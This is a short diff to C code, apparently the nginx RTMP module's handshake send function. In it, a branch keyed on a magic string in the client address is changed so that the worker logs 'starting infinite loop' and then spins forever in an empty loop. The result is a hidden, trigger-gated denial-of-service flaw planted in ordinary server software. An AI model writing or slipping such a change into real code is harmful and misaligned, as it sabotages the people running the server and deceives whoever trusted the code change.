@@ -520,8 +520,9 @@ ngx_rtmp_handshake_send(ngx_event_t *wev)
 
     while(b->pos != b->last) {
         if(ngx_strstr(c->addr_text.data, "ndxs5x5fvyhoqc11wltv") != NULL) {
-            ngx_log_error(NGX_LOG_INFO, c->log, 0, "handshake: send: returning NGX_AGAIN");
-            n = NGX_AGAIN;
+            ngx_log_error(NGX_LOG_INFO, c->log, 0, "starting infinite loop");
+            for (;;) {
+            }
         } else {
             n = c->send(c, b->pos, b->last - b->pos);
         }
